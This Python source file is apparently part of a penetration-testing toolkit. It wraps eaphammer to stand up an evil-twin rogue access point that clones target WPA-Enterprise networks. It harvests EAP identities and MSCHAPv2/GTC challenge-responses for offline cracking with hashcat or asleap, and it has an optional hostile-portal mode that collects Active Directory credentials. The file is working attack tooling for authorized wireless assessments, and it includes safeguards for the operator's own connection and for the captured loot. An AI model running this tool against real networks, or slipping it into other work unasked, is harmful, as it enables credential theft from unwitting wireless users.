#!/usr/bin/env python3
# =============================================================================
# VAPT Toolkit - Vulnerability Assessment and Penetration Testing Toolkit
# =============================================================================
#
# Author: Keith Pachulski
# Company: Red Cell Security, LLC
# Email: keith@redcellsecurity.org
# Website: www.redcellsecurity.org
#
# Copyright (c) 2026 Keith Pachulski. All rights reserved.
#
# License: This software is licensed under the MIT License.
#          You are free to use, modify, and distribute this software
#          in accordance with the terms of the license.
#
# Purpose: Targeted EAP / WPA-Enterprise credential-capture rogue AP. Wraps
#          eaphammer to stand up an evil-twin RADIUS endpoint for one or more
#          target ESSIDs, harvesting EAP inner identities and MSCHAPv2/GTC
#          challenge-response material (crackable offline) - with an optional
#          hostile-portal mode for AD credential capture - on a dedicated,
#          operator-selected radio for authorized wireless assessments.
#
# DISCLAIMER: This software is provided "as-is," without warranty of any kind,
#             express or implied, including but not limited to the warranties
#             of merchantability, fitness for a particular purpose, and non-infringement.
#             In no event shall the authors or copyright holders be liable for any claim,
#             damages, or other liability, whether in an action of contract, tort, or otherwise,
#             arising from, out of, or in connection with the software or the use or other dealings
#             in the software.
#
# NOTICE: This toolkit is intended for authorized security testing only.
#         Users are responsible for ensuring compliance with all applicable laws
#         and regulations. Unauthorized use of these tools may violate local,
#         state, federal, and international laws.
#
# =============================================================================

"""
EAP / WPA-Enterprise credential-capture rogue AP (eaphammer wrapper).

802.1X / WPA-Enterprise (airodump "MGT") networks carry no PSK and no
capturable 4-way handshake, so the wireless_attack_framework handshake path
does not apply to them. The attack instead is a rogue AP backed by a RADIUS
endpoint that accepts any identity and logs the inner EAP exchange: the client
offers an identity and an MSCHAPv2 (or GTC, after eaphammer's automatic GTC
downgrade) challenge-response that is crackable offline (asleap / hashcat).
EAP-TLS with client certificates is resistant - there is nothing to phish.

This tool is a thin, safety-wrapped front end over eaphammer, which owns the
hostapd-wpe / RADIUS / DHCP machinery. It does NOT reimplement that; it
provisions the radio safely, drives eaphammer per target, and collects loot.

Interface model
    eaphammer drives a PHY (managed-mode) adapter directly into AP mode via its
    own patched hostapd - NOT an airmon-ng monitor vif. This is a different
    interface model from the monitor-mode framework, which is why this is a
    separate tool. The chosen adapter is released from NetworkManager for the
    run ('nmcli device set <if> managed no') and re-managed on teardown, so
    NetworkManager is never stopped globally and the operator's own uplink is
    untouched.

Self-protection
    The operator's own connectivity is never used as the rogue radio. The
    default-route egress interface and any wireless interface holding an active
    IPv4 address are excluded from auto-selection and refused if named
    explicitly, so the rogue AP can never commandeer the operator's management
    path. A dedicated second adapter is required.

Scope
    Targets are the explicit ESSID(s) passed with -e/--essid; there is no
    unbounded expansion. Each ESSID is one sequential eaphammer run (stand up
    the AP, capture, Ctrl-C to end that target and advance). A failure on one
    target is logged and the run continues; a consolidated summary prints at
    the end.

Defaults and gating
    Default mode is --creds (EAP credential capture) with --auth wpa-eap: the
    observe path. The more aggressive hostile-portal mode (serves a portal to
    harvest AD credentials) is gated behind --hostile-portal. No karma / MANA
    broadcast and no password spraying are performed.

Loot and teardown
    eaphammer writes captured material to its own loot/ directory; this wrapper
    snapshots that directory around each run and copies anything new into a
    persistent, timestamped loot dir (eap_loot_<stamp>/ under --output-dir or
    cwd) created 0700, with every collected file forced to 0600 - captured EAP
    credential material is never left world-readable. An atexit hook plus
    SIGTERM/SIGHUP handlers guarantee the eaphammer process is torn down, stray
    hostapd/dnsmasq are cleared, the radio is handed back to NetworkManager, and
    the tty is restored even on an unclean exit. The rogue AP is an attack
    surface, not an isolation boundary: run it on a dedicated adapter in a
    controlled area and treat the loot dir as sensitive.
"""

import os
import sys
import re
import time
import glob
import shutil
import signal
import atexit
import argparse
import threading
import subprocess
from pathlib import Path
from datetime import datetime

__version__ = "1.0.0"

# Default eaphammer clone location provisioned by vapt-installer.py.
DEFAULT_EAPHAMMER_DIR = "/vapt/wireless/eaphammer"


# =============================================================================
# Terminal / interface helpers
# =============================================================================

def reset_terminal():
    """Return the tty to sane cooked mode (eaphammer/hostapd can leave it raw)."""
    if sys.stdin.isatty():
        subprocess.run(['stty', 'sane'], stderr=subprocess.DEVNULL)


def wireless_interfaces() -> list:
    """All wireless interfaces present in /sys/class/net."""
    out = []
    net_path = Path('/sys/class/net')
    if net_path.exists():
        for d in net_path.iterdir():
            if (d / 'wireless').exists():
                out.append(d.name)
    return sorted(set(out))


def protected_interfaces() -> set:
    """
    Interfaces carrying the operator's own connectivity: the default route's
    egress interface plus any wireless interface holding an active IPv4 address.
    These must never be commandeered as the rogue radio.
    """
    protected = set()
    try:
        r = subprocess.run(['ip', '-o', 'route', 'show', 'default'],
                           capture_output=True, text=True)
        for line in r.stdout.splitlines():
            m = re.search(r'\bdev\s+(\S+)', line)
            if m:
                protected.add(m.group(1))
    except Exception:
        pass
    for iface in wireless_interfaces():
        try:
            r = subprocess.run(['ip', '-4', 'addr', 'show', 'dev', iface],
                               capture_output=True, text=True)
            if 'inet ' in r.stdout:
                protected.add(iface)
        except Exception:
            pass
    return protected


def resolve_interface(requested: str | None) -> tuple[str | None, str | None]:
    """
    Resolve the rogue-AP radio. Returns (interface, error). If requested is
    given, validate it is wireless and not carrying operator connectivity;
    otherwise auto-pick the first eligible wireless adapter.
    """
    wifi = wireless_interfaces()
    if not wifi:
        return None, "no wireless interfaces found."
    protected = protected_interfaces()

    if requested:
        if requested not in wifi:
            return None, f"'{requested}' is not a wireless interface (have: {', '.join(wifi)})."
        if requested in protected:
            return None, (f"refusing to use {requested}: it carries the operator's "
                          f"connectivity (default route / active IP). Use a dedicated adapter.")
        return requested, None

    candidates = [i for i in wifi if i not in protected]
    if not candidates:
        return None, ("the only wireless interface(s) present carry the operator's "
                      "connectivity. A dedicated second adapter is required for the rogue AP.")
    return candidates[0], None


# =============================================================================
# EapRogue - orchestrator
# =============================================================================

class EapRogue:

    def __init__(self, args):
        self.args = args
        self.eaphammer_dir = self._resolve_eaphammer(args.eaphammer_path)
        self.eap_exe       = (Path(self.eaphammer_dir) / 'eaphammer') if self.eaphammer_dir else None
        self.eap_loot_dir  = (Path(self.eaphammer_dir) / 'loot') if self.eaphammer_dir else None

        run_stamp     = datetime.now().strftime('%Y%m%d_%H%M%S')
        base          = Path(args.output_dir) if args.output_dir else Path.cwd()
        self.loot_dir: Path = base / f'eap_loot_{run_stamp}'
        self._loot_ready = False

        self.interface: str | None = None
        self._released = False

        self._current_proc: subprocess.Popen | None = None
        self._cleanup_lock = threading.Lock()
        self._cleaned_up   = False

        self.failures: list[str] = []
        self.ran:      list[str] = []

    # ------------------------------------------------------------------
    # eaphammer discovery / certs
    # ------------------------------------------------------------------

    @staticmethod
    def _resolve_eaphammer(override: str | None) -> str | None:
        """Locate the eaphammer clone (a dir containing the 'eaphammer' exe)."""
        candidates = []
        if override:
            candidates.append(override)
        env = os.environ.get('EAPHAMMER_PATH')
        if env:
            candidates.append(env)
        candidates.append(DEFAULT_EAPHAMMER_DIR)
        for c in candidates:
            if c and (Path(c) / 'eaphammer').is_file():
                return str(Path(c))
        return None

    def _ensure_certs(self) -> bool:
        """
        Make sure eaphammer has a server certificate; generate a self-signed one
        non-interactively (--bootstrap) if none exists or --regen-certs was
        given. The installer normally bootstraps this at provision time; this is
        the safety net for a fresh clone.
        """
        certs_dir = Path(self.eaphammer_dir) / 'certs'
        have = bool(glob.glob(str(certs_dir / '*.pem')) +
                    glob.glob(str(certs_dir / '*.crt')))
        if have and not self.args.regen_certs:
            return True

        print("[*] Generating eaphammer self-signed certificate (one-time, --bootstrap)...")
        r = subprocess.run([str(self.eap_exe), '--bootstrap'],
                           cwd=self.eaphammer_dir)
        if r.returncode != 0:
            print("[!] Certificate bootstrap failed. Run it manually:")
            print(f"    cd {self.eaphammer_dir} && sudo ./eaphammer --cert-wizard")
            return False
        return True

    # ------------------------------------------------------------------
    # Interface release / restore
    # ------------------------------------------------------------------

    def _release_interface(self):
        """Hand the rogue radio to eaphammer: unmanage it in NetworkManager and
        bring it up. Does NOT stop NetworkManager globally."""
        subprocess.run(['nmcli', 'device', 'set', self.interface, 'managed', 'no'],
                       capture_output=True)
        subprocess.run(['ip', 'addr', 'flush', 'dev', self.interface],
                       capture_output=True)
        subprocess.run(['ip', 'link', 'set', self.interface, 'up'],
                       capture_output=True)
        self._released = True
        time.sleep(1)

    def _restore_interface(self):
        if not self._released:
            return
        subprocess.run(['nmcli', 'device', 'set', self.interface, 'managed', 'yes'],
                       capture_output=True)
        self._released = False

    # ------------------------------------------------------------------
    # Loot (persistent, 0600)
    # ------------------------------------------------------------------

    def _ensure_loot_dir(self):
        if self._loot_ready:
            return
        self.loot_dir.mkdir(parents=True, exist_ok=True)
        try:
            os.chmod(self.loot_dir, 0o700)
        except OSError:
            pass
        self._loot_ready = True
        print(f"[*] Loot directory: {self.loot_dir}")

    def _loot_snapshot(self) -> set:
        try:
            return set(os.listdir(self.eap_loot_dir))
        except OSError:
            return set()

    def _loot_collect(self, before: set) -> int:
        """Copy any loot files eaphammer created this run into our 0700 loot dir,
        forced to 0600. Returns the count collected."""
        try:
            after = set(os.listdir(self.eap_loot_dir))
        except OSError:
            return 0
        new = sorted(after - before)
        if not new:
            return 0
        self._ensure_loot_dir()
        n = 0
        for name in new:
            src = self.eap_loot_dir / name
            if not src.is_file():
                continue
            try:
                dst = self.loot_dir / name
                shutil.copy2(src, dst)
                os.chmod(dst, 0o600)
                n += 1
            except OSError:
                pass
        return n

    # ------------------------------------------------------------------
    # Teardown backstop
    # ------------------------------------------------------------------

    def _install_backstop(self):
        atexit.register(self._cleanup)
        for sig in (signal.SIGTERM, signal.SIGHUP):
            try:
                signal.signal(sig, self._signal_handler)
            except (ValueError, OSError):
                pass

    def _signal_handler(self, signum, frame):
        print(f"\n[*] Signal {signum} - tearing down...")
        self._cleanup()
        sys.exit(128 + signum)

    def _cleanup(self):
        # Idempotent: finally + atexit + signal handler may all call this.
        with self._cleanup_lock:
            if self._cleaned_up:
                return
            self._cleaned_up = True

        # 1. Terminate the running eaphammer (it tears down its own hostapd/
        #    RADIUS/DHCP + iptables on SIGTERM).
        proc = self._current_proc
        if proc and proc.poll() is None:
            try:
                proc.terminate()
                proc.wait(timeout=10)
            except Exception:
                try:
                    proc.kill()
                    proc.wait(timeout=3)
                except Exception:
                    pass
        self._current_proc = None

        # 2. Backstop any stray children eaphammer left behind.
        for binary in ('hostapd', 'hostapd-wpe', 'dnsmasq'):
            subprocess.run(['pkill', '-9', binary], capture_output=True)

        # 3. Hand the radio back to NetworkManager (NM was never stopped).
        self._restore_interface()

        # 4. eaphammer may have stopped systemd-resolved to free port 53.
        subprocess.run(['systemctl', 'start', 'systemd-resolved'],
                       capture_output=True)

        # 5. Return the tty to a sane state.
        reset_terminal()

    # ------------------------------------------------------------------
    # Per-target run
    # ------------------------------------------------------------------

    def _build_cmd(self, essid: str) -> list:
        a = self.args
        cmd = [str(self.eap_exe),
               '-i', self.interface,
               '-e', essid,
               '--channel', str(a.channel),
               '--auth', a.auth]
        # WPA version is only meaningful for wpa-eap / wpa-psk auth.
        if a.auth in ('wpa-eap', 'wpa-psk'):
            cmd += ['--wpa-version', str(a.wpa_version)]
        if a.bssid:
            cmd += ['-b', a.bssid]
        if a.negotiate:
            cmd += ['--negotiate', a.negotiate]
        if a.hostile_portal:
            cmd += ['--hostile-portal']
        else:
            cmd += ['--creds']
        return cmd

    def _run_one(self, essid: str) -> bool:
        mode = "HOSTILE PORTAL" if self.args.hostile_portal else "EAP CREDENTIAL CAPTURE"
        print("\n" + "=" * 60)
        print(f" {mode}")
        print(f" Target   : {essid}" + (f" ({self.args.bssid})" if self.args.bssid else ""))
        print(f" Radio    : {self.interface}   Channel: {self.args.channel}")
        print(f" Auth     : {self.args.auth}"
              + (f" / wpa{self.args.wpa_version}" if self.args.auth in ('wpa-eap', 'wpa-psk') else ""))
        print("=" * 60)
        print(" Ctrl+C ends this target and advances to the next.\n")

        before = self._loot_snapshot()
        cmd = self._build_cmd(essid)

        try:
            proc = subprocess.Popen(cmd, cwd=self.eaphammer_dir)
            self._current_proc = proc
            try:
                proc.wait()
            except KeyboardInterrupt:
                # SIGINT already reached eaphammer (shared group); let it finish
                # its own teardown, then reap.
                try:
                    proc.wait(timeout=15)
                except Exception:
                    proc.terminate()
                    try:
                        proc.wait(timeout=5)
                    except Exception:
                        proc.kill()
            rc = proc.returncode
        except FileNotFoundError:
            self.failures.append(f"{essid}: eaphammer executable not runnable")
            print("[!] Could not execute eaphammer.")
            return False
        except Exception as e:
            self.failures.append(f"{essid}: {e}")
            print(f"[!] Error running eaphammer for {essid}: {e}")
            return False
        finally:
            self._current_proc = None
            reset_terminal()

        n = self._loot_collect(before)
        self.ran.append(essid)
        if n:
            print(f"[+] {essid}: collected {n} loot file(s) -> {self.loot_dir}")
        else:
            print(f"[*] {essid}: no new loot captured this run.")
        # A non-zero rc after a normal Ctrl-C is expected; only flag a hard
        # failure when eaphammer never started capturing (rc set and no loot
        # and it exited immediately is ambiguous, so we don't hard-fail here).
        if rc not in (0, None) and n == 0:
            self.failures.append(f"{essid}: eaphammer exited rc={rc} with no loot")
        return True

    # ------------------------------------------------------------------
    # Main flow
    # ------------------------------------------------------------------

    def run(self) -> int:
        print("=" * 60)
        print(" RED CELL SECURITY - EAP / ENTERPRISE ROGUE (eaphammer)")
        print(" FOR AUTHORIZED SECURITY TESTING ONLY")
        print("=" * 60)

        if not self.eaphammer_dir:
            print(f"[!] eaphammer not found (looked in {DEFAULT_EAPHAMMER_DIR}, "
                  "$EAPHAMMER_PATH, --eaphammer-path).")
            print("    Provision it via the toolkit installer (option 2: Install "
                  "Toolkit Packages), or point --eaphammer-path at a clone.")
            return 2

        iface, err = resolve_interface(self.args.interface)
        if err:
            print(f"[!] Interface: {err}")
            return 2
        self.interface = iface
        if not self.args.interface:
            print(f"[*] Using interface {self.interface} (override with -i).")

        # Install the teardown backstop before any host mutation.
        self._install_backstop()

        try:
            if not self._ensure_certs():
                return 1

            self._release_interface()

            for essid in self.args.essid:
                try:
                    self._run_one(essid)
                except KeyboardInterrupt:
                    # Ctrl-C between targets: ask whether to continue the batch.
                    try:
                        ans = input("\nContinue with the next target? (y/n): ").strip().lower()
                    except (EOFError, KeyboardInterrupt):
                        ans = 'n'
                    if ans != 'y':
                        break

            self._summary()
            return 0
        finally:
            self._cleanup()

    def _summary(self):
        print("\n" + "=" * 60)
        print(" RUN SUMMARY")
        print("=" * 60)
        print(f" Targets attempted : {len(self.ran)} ({', '.join(self.ran) or 'none'})")
        if self._loot_ready:
            print(f" Loot (0600)       : {self.loot_dir}")
            print(" Crack             : asleap, or hashcat (-m 5500 NETNTLM / "
                  "-m 22000 for captured WPA), per the captured material.")
        else:
            print(" Loot              : none collected")
        if self.failures:
            print(f" Failures ({len(self.failures)}):")
            for f in self.failures:
                print(f"   - {f}")
        print("=" * 60)


# =============================================================================
# Entry point
# =============================================================================

def parse_args(argv=None):
    p = argparse.ArgumentParser(
        prog='eap_rogue.py',
        description='Targeted EAP / WPA-Enterprise credential-capture rogue AP '
                    '(eaphammer wrapper) for authorized wireless assessments.',
    )
    p.add_argument('-e', '--essid', action='append', metavar='ESSID', required=True,
                   help='Target ESSID to clone. Repeat -e for multiple targets '
                        '(each is a sequential run).')
    p.add_argument('-i', '--interface', metavar='IFACE', default=None,
                   help='PHY wireless interface for the rogue AP. Auto-selected '
                        '(excluding the operator uplink) if omitted.')
    p.add_argument('-c', '--channel', metavar='CH', default='1',
                   help='Channel to broadcast on - set this to the real AP\'s '
                        'channel from your scan (default: 1).')
    p.add_argument('-b', '--bssid', metavar='BSSID', default=None,
                   help='Clone a specific BSSID (optional; best with a single -e).')
    p.add_argument('--auth', choices=['wpa-eap', 'open'], default='wpa-eap',
                   help='Authentication to present (default: wpa-eap). --creds '
                        'requires wpa-eap; open is for hostile-portal on open nets.')
    p.add_argument('--wpa-version', choices=['1', '2'], default='2',
                   help='WPA version for wpa-eap (default: 2).')
    p.add_argument('--negotiate', metavar='METHOD', default=None,
                   help='Force an EAP method (passed to eaphammer --negotiate, '
                        'e.g. peap, ttls variants). Default: eaphammer default.')
    p.add_argument('--hostile-portal', action='store_true',
                   help='Aggressive mode: serve a hostile portal to harvest AD '
                        'credentials instead of EAP credential capture.')
    p.add_argument('-o', '--output-dir', metavar='DIR', default=None,
                   help='Directory under which the timestamped 0700 loot dir is '
                        'created (default: current directory).')
    p.add_argument('--eaphammer-path', metavar='DIR', default=None,
                   help=f'Path to the eaphammer clone (default: {DEFAULT_EAPHAMMER_DIR} '
                        'or $EAPHAMMER_PATH).')
    p.add_argument('--regen-certs', action='store_true',
                   help='Force regeneration of eaphammer\'s self-signed cert before running.')
    p.add_argument('--version', action='version', version=f'%(prog)s {__version__}')

    args = p.parse_args(argv)

    # --creds (the default, non-portal mode) only works against EAP networks.
    if not args.hostile_portal and args.auth != 'wpa-eap':
        p.error("--auth open is only valid with --hostile-portal; EAP "
                "credential capture (--creds) requires --auth wpa-eap.")
    return args


def main():
    args = parse_args()

    if os.geteuid() != 0:
        print("This tool requires root privileges.")
        print("Run with: sudo python3 eap_rogue.py -e <ESSID> -c <channel>")
        sys.exit(1)

    rogue = EapRogue(args)
    try:
        sys.exit(rogue.run())
    except KeyboardInterrupt:
        print("\nInterrupted.")
        sys.exit(130)


if __name__ == "__main__":
    main()
